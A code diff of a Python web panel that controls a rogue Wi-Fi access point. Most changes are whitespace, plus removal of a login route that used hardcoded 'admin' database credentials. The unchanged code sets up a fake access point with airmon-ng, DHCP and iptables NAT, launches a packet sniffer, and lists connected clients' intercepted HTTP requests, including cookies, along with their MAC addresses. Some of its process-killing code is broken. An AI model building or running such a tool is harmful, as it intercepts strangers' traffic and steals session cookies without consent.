@@ -8,7 +8,6 @@ import platform
 import sqlite3
 import hashlib
 import psutil
-import signal
 import json
 import time
 import web
@@ -18,69 +17,38 @@ import os
 DN = open(os.devnull, 'w')
 
 urls = (
-    "/","dataCenter",
-    "/regist","doRegist",
-    "/login","doLogin",
-    "/manage","dataCenter",
-    "/sysinfo","systemInfo",
-    "/allinfo","getLinuxInfo",
-    "/getCurrent","currentInfo",
-    "/getInterface","netIface",
-    "/createAp","createAP",
-    "/cleanup","cleanEnv",
-    "/getusers","getUsers",
-    "/gethttp","getHTTP",
-    "/queryUser","queryAllUsers",
-    "/queryHttp","queryReqlist"
+    "/", "dataCenter",
+    "/manage", "dataCenter",
+    "/sysinfo", "systemInfo",
+    "/allinfo", "getLinuxInfo",
+    "/getCurrent", "currentInfo",
+    "/getInterface", "netIface",
+    "/createAp", "createAP",
+    "/cleanup", "cleanEnv",
+    "/getusers", "getUsers",
+    "/gethttp", "getHTTP",
+    "/queryUser", "queryAllUsers",
+    "/queryHttp", "queryReqlist"
 )
 
-#static
+
 render = web.template.render('templates',cache=False)
 
-#init program
+
 class index:
     def GET(self):
         return render.index()
 
-#login
-class doLogin:
-    def POST(self):
-        loginUser = web.input().get("username")
-        loginPass = web.input().get("password")
 
-        if len(loginUser) < 5:
-            return json.dumps({"code":-1,"msg":"用户名不能小于5位"})
-            sys.exit()
-        if len(loginPass) < 5:
-            return json.dumps({"code":-1,"msg":"密码不能小于5位"})
-            sys.exit()
-        try:
-            client = MongoClient('localhost', 27017)
-            db = client.wifirecord
-            db.authenticate("admin","admin")
-
-            allcollections = db.collection_names(include_system_collections=False)
-            print "[log]["+ str(datetime.datetime.now()) +"] :Find collections list :" + str(allcollections)
-
-            collection = db.users
-
-            if collection.find_one({"username":loginUser,"password":loginPass}) == None:
-                return json.dumps({"code":-1,"msg":"用户名或密码错误"})
-            else:
-                return json.dumps({"code":0})
-        except Exception,e:
-            print "[e]["+ str(datetime.datetime.now()) +"] : Exception:" + str(e)
-            return json.dumps({"code":-1,"msg":"数据库连接失败"})
-
-#main
 class dataCenter:
     def GET(self):
         return render.data()
 
-#sysinfo
+
 class systemInfo:
     def GET(self):
         return render.systeminfo()
+
 
 class getLinuxInfo:
     def POST(self):
@@ -93,38 +61,39 @@ class getLinuxInfo:
         logiccore = psutil.cpu_count()
         phycore = psutil.cpu_count(logical=False)
         if phycore == None : phycore = 1
-        phymem = round(psutil.virtual_memory()[0]/1024.0/1024.0,2)
+        phymem = round(psutil.virtual_memory()[0]/1024.0/1024.0, 2)
         starttime = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
-        disktotal = round(psutil.disk_usage('/')[0]/1024.0/1024.0/1024.0,2)
-        diskused = round(psutil.disk_usage('/')[1]/1024.0/1024.0/1024.0,2)
-        diskfree = round(psutil.disk_usage('/')[2]/1024.0/1024.0/1024.0,2)
+        disktotal = round(psutil.disk_usage('/')[0]/1024.0/1024.0/1024.0, 2)
+        diskused = round(psutil.disk_usage('/')[1]/1024.0/1024.0/1024.0, 2)
+        diskfree = round(psutil.disk_usage('/')[2]/1024.0/1024.0/1024.0, 2)
 
         thisPid = os.getpid()
 
         return json.dumps(
             {
-                "code":0,
-                "system":{
-                    "hostname":hostname,
-                    "release":release,
-                    "version":version,
-                    "machine":machine,
-                    "processor":processor,
-                    "starttime":starttime
+                "code": 0,
+                "system": {
+                    "hostname": hostname,
+                    "release": release,
+                    "version": version,
+                    "machine": machine,
+                    "processor": processor,
+                    "starttime": starttime
                 },
-                "hard":{
-                    "logiccore":logiccore,
-                    "phycore":phycore,
-                    "phymem":phymem,
-                    "disktotal":disktotal,
-                    "diskused":diskused,
-                    "diskfree":diskfree
+                "hard": {
+                    "logiccore": logiccore,
+                    "phycore": phycore,
+                    "phymem": phymem,
+                    "disktotal": disktotal,
+                    "diskused": diskused,
+                    "diskfree": diskfree
                 },
-                "os":{
-                    "thisPid":thisPid
+                "os": {
+                    "thisPid": thisPid
                 }
             }
         )
+
 
 class currentInfo:
     def POST(self):
@@ -133,22 +102,23 @@ class currentInfo:
         diskused = psutil.disk_usage('/')[3]
         pidcount = len(psutil.pids())
 
-        uptimeshell = subprocess.Popen(['uptime'],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+        uptimeshell = subprocess.Popen(['uptime'], stderr=subprocess.PIPE,stdout=subprocess.PIPE)
         uptimeshell.wait()
         uptime = uptimeshell.communicate()
 
         return json.dumps(
             {
-                "code":0,
-                "current":{
-                    "cpuused":cpuused,
-                    "memused":memused,
-                    "diskused":diskused,
-                    "pidcount":pidcount,
-                    "uptime":uptime
+                "code": 0,
+                "current": {
+                    "cpuused": cpuused,
+                    "memused": memused,
+                    "diskused": diskused,
+                    "pidcount": pidcount,
+                    "uptime": uptime
                 }
             }
         )
+
 
 class netIface:
     def POST(self):
@@ -164,7 +134,7 @@ class netIface:
 
         ips = []
         for thisIface in interfaces:
-            tempres = os.popen("ifconfig "+thisIface).read()
+            tempres = os.popen("ifconfig " + thisIface).read()
             tempip = '无'
             for line in tempres.split('\n'):
                 if "netmask" in line:
@@ -192,17 +162,19 @@ class netIface:
             else:
                 tempstatus = "断开"
 
-            istatus.append({"name":iface,"status":tempstatus,"mac":macs[interfaces.index(iface)],"ip":ips[interfaces.index(iface)]})
+            istatus.append({"name": iface, "status": tempstatus, "mac": macs[interfaces.index(iface)], "ip": ips[interfaces.index(iface)]})
 
         wirelessiface = []
         proc = subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE, stderr=DN)
         wiface = proc.communicate()[0].split('\n')
         for line in wiface:
             if "IEEE 8" in line:
-                if 'mon' in line: continue
+                if 'mon' in line:
+                    continue
                 wirelessiface.append(line.split()[0])
 
-        return json.dumps({"code":0,"interfaces":istatus,"wireless":wirelessiface})
+        return json.dumps({"code": 0, "interfaces": istatus, "wireless": wirelessiface})
+
 
 class createAP:
     def POST(self):
@@ -222,32 +194,37 @@ class createAP:
         ipprefix = getIpfix(inet)
         dhcpconf = dhcp_conf(ipprefix)
         dhcp(dhcpconf, ipprefix)
-        proc = subprocess.Popen(['python',sys.path[0]+'/sniffer.py'], stdout=DN, stderr=DN)
-        return json.dumps({"code":0})
+        proc = subprocess.Popen(['python', sys.path[0] + '/sniffer.py'], stdout=DN, stderr=DN)
+        return json.dumps({"code": 0})
+
 
 class getUsers:
     def GET(self):
         return render.users()    
 
+
 class getHTTP:
     def GET(self):
-        return render.http()    
+        return render.http()
+
+
 class queryReqlist:
     def GET(self):
         httpList = []
         try:
-            cx = sqlite3.connect(sys.path[0]+"/wifihttp.db")
+            cx = sqlite3.connect(sys.path[0] + "/wifihttp.db")
             cu = cx.cursor() 
             cu.execute("select * from httprec order by createtime desc limit 30")
             rows = cu.fetchall()
             cu.close()
             cx.close()
             for r in rows:
-                httpList.append({"id":r[0],"type":r[1],"uri":r[2],"ua":r[3],"host":r[4],"referer":r[5],"createtime":r[6],"cookie":r[7]})
+                httpList.append({"id": r[0], "type": r[1],"uri":r[2],"ua":r[3],"host":r[4],"referer":r[5],"createtime":r[6],"cookie":r[7]})
             return json.dumps({"code":0,"rows":httpList})
         except Exception, e:
             killpid = os.system('fuser wifihttp.db').read().split(':')[1]
             os.system('kill '+killpid)
+
 
 class cleanEnv:
     def POST(self):
@@ -261,6 +238,7 @@ class cleanEnv:
         rm_mon()
         time.sleep(2)
         return json.dumps({"code":0})
+
 
 class queryAllUsers:
     def GET(self):
@@ -280,11 +258,13 @@ class queryAllUsers:
             killpid = os.system('fuser wifihttp.db').read().split(':')[1]
             os.system('kill '+killpid)
 
+
 def saveUsersToSqlite():
     users = []
     proc = subprocess.Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     pks = proc.communicate()[0].split('}\n')
-    if len(pks[-1]) == 0: pks.pop()
+    if len(pks[-1]) == 0:
+        pks.pop()
     for p in pks:
         hostname = ''
         ipaddress = ''
@@ -294,22 +274,25 @@ def saveUsersToSqlite():
         pline = p.split('\n')
         for line in pline:
             if "client-hostname" in line:
-                hostname = line.split()[1].replace('"','')[:-1]
+                hostname = line.split()[1].replace('"', '')[:-1]
             if "lease" in line and "{" in line:
                 ipaddress = line.split()[1]
             if "starts" in line:
-                start_utc = line.split()[2].replace('/','-')+' '+line.split()[3][:-1]
+                start_utc = line.split()[2].replace('/', '-')+' '+line.split()[3][:-1]
             if "hardware" in line:
                 mac = line.split()[2][:-1]
             if "uid" in line and "server-duid" not in line:
-                uid = line.split()[1].replace('"','')[:-1]
+                uid = line.split()[1].replace('"', '')[:-1]
                 
-        if len(hostname)<1:hostname = '---'
-        if len(uid)<1:uid = '---'
+        if len(hostname) < 1:
+            hostname = '---'
+        if len(uid) < 1:
+            uid = '---'
         m2 = hashlib.md5()   
         m2.update(start_utc+mac+uid)
 
-        if len(mac) > 0:users.append((start_utc,mac,ipaddress,uid,hostname,m2.hexdigest()))
+        if len(mac) > 0:
+            users.append((start_utc, mac, ipaddress, uid, hostname, m2.hexdigest()))
 
     for u in users:
         try:
@@ -323,8 +306,9 @@ def saveUsersToSqlite():
             cx.close()
         except Exception, e:
             killpid = os.system('fuser wifihttp.db').read().split(':')[1]
-            os.system('kill '+killpid)
+            os.system('kill ' + killpid)
             saveUsersToSqlite()
+
 
 def getIpfix(inet_face):
     tempip = ''
@@ -334,6 +318,7 @@ def getIpfix(inet_face):
             tempip = line.split()[1][:2]
     return tempip
 
+
 def iptables(inet_iface):
     os.system('iptables -X')
     os.system('iptables -F')
@@ -341,6 +326,7 @@ def iptables(inet_iface):
     os.system('iptables -t nat -X')
     os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
 
 def start_monitor(ap_iface, channel):
     proc = subprocess.Popen(['airmon-ng', 'start', ap_iface, channel], stdout=subprocess.PIPE, stderr=DN)
@@ -351,6 +337,7 @@ def start_monitor(ap_iface, channel):
             line = line.split()
             mon_iface = line[6].split(']')[1]
             return mon_iface
+
 
 def dhcp_conf(ipprefix):
     config = ('default-lease-time 300;\n'
@@ -371,6 +358,7 @@ def dhcp_conf(ipprefix):
             dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '114.114.114.114'))
     return '/tmp/dhcpd.conf'
 
+
 def start_ap(mon_iface, channel, essid, key, ap):
     print '[*] Starting the fake access point...'
     print '[*] Waiting for 6 seconds...'
@@ -386,6 +374,7 @@ def start_ap(mon_iface, channel, essid, key, ap):
     except Exception,e:
         print e
 
+
 def dhcp(dhcpconf, ipprefix):
     os.system('echo > /var/lib/dhcp/dhcpd.leases')
     dhcp = subprocess.Popen(['dhcpd', '-cf', dhcpconf], stdout=subprocess.PIPE, stderr=DN)
@@ -393,6 +382,7 @@ def dhcp(dhcpconf, ipprefix):
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
     else:
         os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')
+
 
 def rm_mon():
     monitors = []
@@ -421,5 +411,5 @@ if __name__ == "__main__":
     if os.geteuid() != 0:
         sys.exit('[Error!!!] You must run this script as root')
 
-    app = web.application(urls,globals())
+    app = web.application(urls, globals())
     app.run()
